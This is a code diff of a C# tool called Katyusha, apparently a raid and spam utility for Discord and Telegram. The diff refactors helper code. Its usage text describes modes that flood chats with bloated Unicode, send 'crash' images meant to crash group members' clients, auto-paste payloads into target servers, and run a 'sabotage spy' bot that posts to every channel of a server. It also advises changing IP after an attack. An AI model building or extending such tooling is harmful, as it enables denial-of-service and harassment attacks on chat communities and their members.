@@ -139,14 +139,102 @@ namespace Katyusha
         {
             if (args.Length != 2 || args[0].Equals("--help", StringComparison.OrdinalIgnoreCase))
             {
-                ShowUsage();
+                Console.WriteLine(@"
+ << Katyusha >> 
+    Usage: Katyusha.exe [directory] [mode] [options]
+                                  \ [mode] [options]
+
+    Mode(s):
+
+      v1 Rockets:
+
+        text / BM-8                 : Uses Text Only. 
+
+                                      Uses a text file from the directory
+        [mode] [directory] [options]  if you dont have a directory it will
+        text (c:\my\directory\)       use the second argument as a Text and
+        bm-8 @everyone My Text!       if not it will default to your current
+                                      clipboard.
+        
+        normal / BM-13              : Uses Images / Gif Files.
+
+        [directory] [mode] [options]  Uses images / gif files in the specified
+        (c:\my\directory) normal      directory, and will go through them top-bottom
+        (c:\my\directory) bm-13                                     
+
+        random / BM-18              : Uses Images / Gif files in random order.
+
+        [directory] [mode] [options]  Randomizing the image will prevent any duplicates
+        (c:\my\directory) random      from making an appearance will improve efficiency
+        (c:\my\directory) bm-18
+
+      v2 Rockets:
+        
+        grad / BM-21                : Uses Destructive Text.
+
+        [mode] [int] [options]        Grad has improved destructiveness as the decendant
+        grad 100                      of BM-8, Uses Bloated Unicode Text, It requires the
+        bm-21 2100                    total number of text it will produce [int].
+
+        uragan / BM-27              : Uses Destructive Images.
+        [directory] [mode] [options]  Uragan a more destructive child of BM-13 and BM-18
+        (c:\my\directory) uragan      Uses Images and tries to make it stretch to the
+        (c:\my\directory) bm-18       Highest limits.
+
+                                      Uragan Corrupts/Image Vortex/Image Crash the Image to
+                                      the target in-order to crash the clients in the group.
+
+      v3 Rockets:
+
+        smerch / BM-30              : Uses sophisticated local image hosting to send to target
+        [directory] [mode] [options]  Outputing Links to the image it will automatically load
+        (c:\my\directory) smerch      as an embeded image, effective against discord servers,
+        (c:\my\directory) bm-30       with embed/links enabked.
+                                    [ Warning: Use VPN / Dynamic IP to change after an attack  ]
+                                    [ This to prevent YOU from being DDoS'ed Because it uses   ]
+                                    [ Your Local/Current IP, This needs to use your Public IP  ]
+                                    [ to work.                                                 ] 
+                               
+      Sabotage:
+        
+        Aldrich                     : A Discord Bot that is a Espionage & Sabotage Spy that
+        [directory] [mode] [options]  can be controlled locally without the use of commands
+        (c:\dir..) aldrich -d         in the Discord Server.
+        (c:\dir..) aldrich -t         
+        
+        -d / --discord / -dd        : Uses Discord Bot
+        -t / --telegram / -tm       : Uses Telegram Bot
+
+    Features:                       
+                                    
+        --timer / -t                : Time limit of the Operation if you don't wan't it to run
+        ..[mode] --timer 15           For long periods. (In Seconds)
+        ..[mode] -t 10
+
+        --macro / -m                : Automates the process of Pasting and Sending the payload
+        ..[mode] --macro              to the target server / group chat.
+        ..[mode] -m
+
+    Controls:
+
+        CapsLock                    : Temporarily Pauses the current Operation(s) of Katyusha
+                                      Including Mode(s) and Features that were used.
+    
+
+        
+    Other:
+        
+                           For more details go to these following links:
+        https://github.com/GenesisFoundationCore/Katyusha | https://github.com/GenesisFoundationCore
+        
+");
                 return;
             }
             folderPath = args[0];
             clienttype = args[2].ToLower();
             token = args[3].ToLower();
 
-            if (!IsValidFolder(folderPath))
+            if (!Directory.Exists(folderPath))
             {
                 Console.WriteLine("Invalid folder path. Please provide a valid folder path. Or use --help");
                 return;
@@ -203,7 +291,13 @@ namespace Katyusha
 
             try
             {
-                imageFiles = GetImageFiles(folderPath);
+                imageFiles = Directory.GetFiles(folderPath, "*.*", SearchOption.AllDirectories)
+                .Where(file => file.ToLower().EndsWith(".jpg") ||
+                               file.ToLower().EndsWith(".jpeg") ||
+                               file.ToLower().EndsWith(".png") ||
+                               file.ToLower().EndsWith(".gif") ||
+                               file.ToLower().EndsWith(".apng"))
+                .ToArray();
             }
             catch (Exception e)
             {
@@ -490,115 +584,6 @@ namespace Katyusha
             }
         }
 
-
-        static string[] GetImageFiles(string folderPath)
-        {
-            return Directory.GetFiles(folderPath, "*.*", SearchOption.AllDirectories)
-                .Where(file => file.ToLower().EndsWith(".jpg") ||
-                               file.ToLower().EndsWith(".jpeg") ||
-                               file.ToLower().EndsWith(".png") ||
-                               file.ToLower().EndsWith(".gif") ||
-                               file.ToLower().EndsWith(".apng"))
-                .ToArray();
-        }
-
-        static bool IsValidFolder(string folderPath)
-        {
-            return Directory.Exists(folderPath);
-        }
-
-        static void ShowUsage()
-        {
-            Console.WriteLine(@"
- << Katyusha >> 
-    Usage: Katyusha.exe [directory] [mode] [options]
-                                  \ [mode] [options]
-
-    Mode(s):
-
-      v1 Rockets:
-
-        text / BM-8                 : Uses Text Only. 
-
-                                      Uses a text file from the directory
-        [mode] [directory] [options]  if you dont have a directory it will
-        text (c:\my\directory\)       use the second argument as a Text and
-        bm-8 @everyone My Text!       if not it will default to your current
-                                      clipboard.
-        
-        normal / BM-13              : Uses Images / Gif Files.
-
-        [directory] [mode] [options]  Uses images / gif files in the specified
-        (c:\my\directory) normal      directory, and will go through them top-bottom
-        (c:\my\directory) bm-13                                     
-
-        random / BM-18              : Uses Images / Gif files in random order.
-
-        [directory] [mode] [options]  Randomizing the image will prevent any duplicates
-        (c:\my\directory) random      from making an appearance will improve efficiency
-        (c:\my\directory) bm-18
-
-      v2 Rockets:
-        
-        grad / BM-21                : Uses Destructive Text.
-
-        [mode] [int] [options]        Grad has improved destructiveness as the decendant
-        grad 100                      of BM-8, Uses Bloated Unicode Text, It requires the
-        bm-21 2100                    total number of text it will produce [int].
-
-        uragan / BM-27              : Uses Destructive Images.
-        [directory] [mode] [options]  Uragan a more destructive child of BM-13 and BM-18
-        (c:\my\directory) uragan      Uses Images and tries to make it stretch to the
-        (c:\my\directory) bm-18       Highest limits.
-
-                                      Uragan Corrupts/Image Vortex/Image Crash the Image to
-                                      the target in-order to crash the clients in the group.
-
-      v3 Rockets:
-
-        smerch / BM-30              : Uses sophisticated local image hosting to send to target
-        [directory] [mode] [options]  Outputing Links to the image it will automatically load
-        (c:\my\directory) smerch      as an embeded image, effective against discord servers,
-        (c:\my\directory) bm-30       with embed/links enabked.
-                                    [ Warning: Use VPN / Dynamic IP to change after an attack  ]
-                                    [ This to prevent YOU from being DDoS'ed Because it uses   ]
-                                    [ Your Local/Current IP, This needs to use your Public IP  ]
-                                    [ to work.                                                 ] 
-                               
-      Sabotage:
-        
-        Aldrich                     : A Discord Bot that is a Espionage & Sabotage Spy that
-        [directory] [mode] [options]  can be controlled locally without the use of commands
-        (c:\dir..) aldrich -d         in the Discord Server.
-        (c:\dir..) aldrich -t         
-        
-        -d / --discord / -dd        : Uses Discord Bot
-        -t / --telegram / -tm       : Uses Telegram Bot
-
-    Features:                       
-                                    
-        --timer / -t                : Time limit of the Operation if you don't wan't it to run
-        ..[mode] --timer 15           For long periods. (In Seconds)
-        ..[mode] -t 10
-
-        --macro / -m                : Automates the process of Pasting and Sending the payload
-        ..[mode] --macro              to the target server / group chat.
-        ..[mode] -m
-
-    Controls:
-
-        CapsLock                    : Temporarily Pauses the current Operation(s) of Katyusha
-                                      Including Mode(s) and Features that were used.
-    
-
-        
-    Other:
-        
-                           For more details go to these following links:
-        https://github.com/GenesisFoundationCore/Katyusha | https://github.com/GenesisFoundationCore
-        
-");
-        }
         private static System.Drawing.Image ConvertBitmapImageToDrawingImage(BitmapImage bitmapImage)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -659,9 +644,29 @@ namespace Katyusha
                             string filePath = Path.Combine(directoryPath, requestedFileName);
                             if (System.IO.File.Exists(filePath))
                             {
+                                switch (fileExtension)
+                                {
+                                    case ".png":
+                                        response.ContentType = "image/png";
+                                        break;
+                                    case ".jpg":
+                                        response.ContentType = "image/jpg";
+                                        break;
+                                    case ".jpeg":
+                                        response.ContentType = "image/jpeg";
+                                        break;
+                                    case ".apng":
+                                        response.ContentType = "image/apng";
+                                        break;
+                                    case ".gif":
+                                        response.ContentType = "image/gif";
+                                        break;
+                                    default:
+                                        response.ContentType = "application/octet-stream";
+                                        break;
+                                }
                                 byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);
                                 response.OutputStream.Write(fileBytes, 0, fileBytes.Length);
-                                response.ContentType = GetContentType(fileExtension);
                                 response.StatusCode = 200;
                                 Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH:mm")}] (+) => {response}");
                                 Clipboard.SetText($"http://{ipAddress}:8080/{requestedFileName}");
@@ -688,25 +693,6 @@ namespace Katyusha
                         Console.WriteLine($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (-) => Error: {ex.Message}");
                     }
                 }
-            }
-        }
-
-        private static string GetContentType(string fileExtension)
-        {
-            switch (fileExtension)
-            {
-                case ".png":
-                    return "image/png";
-                case ".jpg":
-                    return "image/jpg";
-                case ".jpeg":
-                    return "image/jpeg";
-                case ".apng":
-                    return "image/apng";
-                case ".gif":
-                    return "image/gif";
-                default:
-                    return "application/octet-stream";
             }
         }
 
@@ -779,8 +765,31 @@ namespace Katyusha
             }
             else
             {
-                IWebDriver driver = GetDriver(browser);
-
+                IWebDriver driver;
+                switch (browser.ToLower())
+                {
+                    case "chrome":
+                        driver = new ChromeDriver();
+                        break;
+                    case "firefox":
+                        driver = new FirefoxDriver();
+                        break;
+                    case "edge":
+                        driver = new EdgeDriver();
+                        break;
+                    case "IE":
+                        driver = new InternetExplorerDriver();
+                        break;
+                    case "safari":
+                        driver = new SafariDriver();
+                        break;
+                    case "chromium":
+                        driver = new ChromeDriver();
+                        break;
+                    default:
+                        throw new NotSupportedException($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (-) => Inavlid / Unsupported Browser: {browser}");
+                }
+                
                 try
                 {
                     while (true)
@@ -797,27 +806,6 @@ namespace Katyusha
             }
         }
 
-        static IWebDriver GetDriver(string browserName)
-        {
-            switch (browserName.ToLower())
-            {
-                case "chrome":
-                    return new ChromeDriver();
-                case "firefox":
-                    return new FirefoxDriver();
-                case "edge":
-                    return new EdgeDriver();
-                case "IE":
-                    return new InternetExplorerDriver();
-                case "safari":
-                    return new SafariDriver();
-                case "chromium":
-                    return new ChromeDriver();
-                default:
-                    throw new NotSupportedException($" << Katyusha >> [{DateTime.Now.ToString("HH: mm")}] (-) => Inavlid / Unsupported Browser: {browserName}");
-            }
-        }
-
         static bool IsAdmin()
         {
             using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
@@ -829,34 +817,34 @@ namespace Katyusha
 
         private DiscordSocketClient dbot;
         private TelegramBotClient tbot;
-        static int botmode;
 
         public async Task Aldrich_KatyushaInternal(string clienttype, string payloads, string token)
         {
             if (clienttype == "--dd" || clienttype == "-d" || clienttype == "--discord")
             {
-                botmode = 1;
                 dbot = new DiscordSocketClient();
                 var guild = dbot.GetGuild(ulong.Parse(token));
                 foreach (var channel in guild.TextChannels)
                 {
-                    await SendImages_KatyushaInternal(channel, payloads, null);
+                    var imageFiles = Directory.GetFiles(payloads, "*.png")
+                                       .Concat(Directory.GetFiles(payloads, "*.jpg"))
+                                       .Concat(Directory.GetFiles(payloads, "*.jpeg"))
+                                       .Concat(Directory.GetFiles(payloads, "*.gif"))
+                                       .Concat(Directory.GetFiles(payloads, "*.apng"))
+                                       .ToArray();
+
+                    foreach (var imagePath in imageFiles)
+                    {
+                        using (var stream = new FileStream(imagePath, FileMode.Open))
+                        {
+                            await channel.SendFileAsync(stream, Path.GetFileName(imagePath));
+                        }
+                    }
                 }
             }
             else if (clienttype == "--tm" || clienttype == "-t" || clienttype == "--telegram")
             {
-                botmode = 2;
                 tbot = new TelegramBotClient(token);
-                await SendImages_KatyushaInternal(null, payloads, tbot);
-
-            }
-            
-        }
-
-        private static async Task SendImages_KatyushaInternal(ITextChannel textChannel, string payloads, TelegramBotClient telegram)
-        {
-            if (botmode == 1)
-            {
                 var imageFiles = Directory.GetFiles(payloads, "*.png")
                                        .Concat(Directory.GetFiles(payloads, "*.jpg"))
                                        .Concat(Directory.GetFiles(payloads, "*.jpeg"))
@@ -868,25 +856,7 @@ namespace Katyusha
                 {
                     using (var stream = new FileStream(imagePath, FileMode.Open))
                     {
-                        await textChannel.SendFileAsync(stream, Path.GetFileName(imagePath));
-                    }
-                }
-            }
-            else
-            {
-                var imageFiles = Directory.GetFiles(payloads, "*.png")
-                                       .Concat(Directory.GetFiles(payloads, "*.jpg"))
-                                       .Concat(Directory.GetFiles(payloads, "*.jpeg"))
-                                       .Concat(Directory.GetFiles(payloads, "*.gif"))
-                                       .Concat(Directory.GetFiles(payloads, "*.apng"))
-                                       .ToArray();
-
-                foreach (var imagePath in imageFiles)
-                {
-                    using (var stream = new FileStream(imagePath, FileMode.Open))
-                    {
-                        await textChannel.SendFileAsync(stream, Path.GetFileName(imagePath));
-                        await telegram.SendPhotoAsync(telegram.BotId, new InputFileStream(stream, Path.GetFileName(imagePath)));
+                        await tbot.SendPhotoAsync(tbot.GetChatAsync(token).Id, new InputFileStream(stream, Path.GetFileName(imagePath)));
                     }
                 }
             }
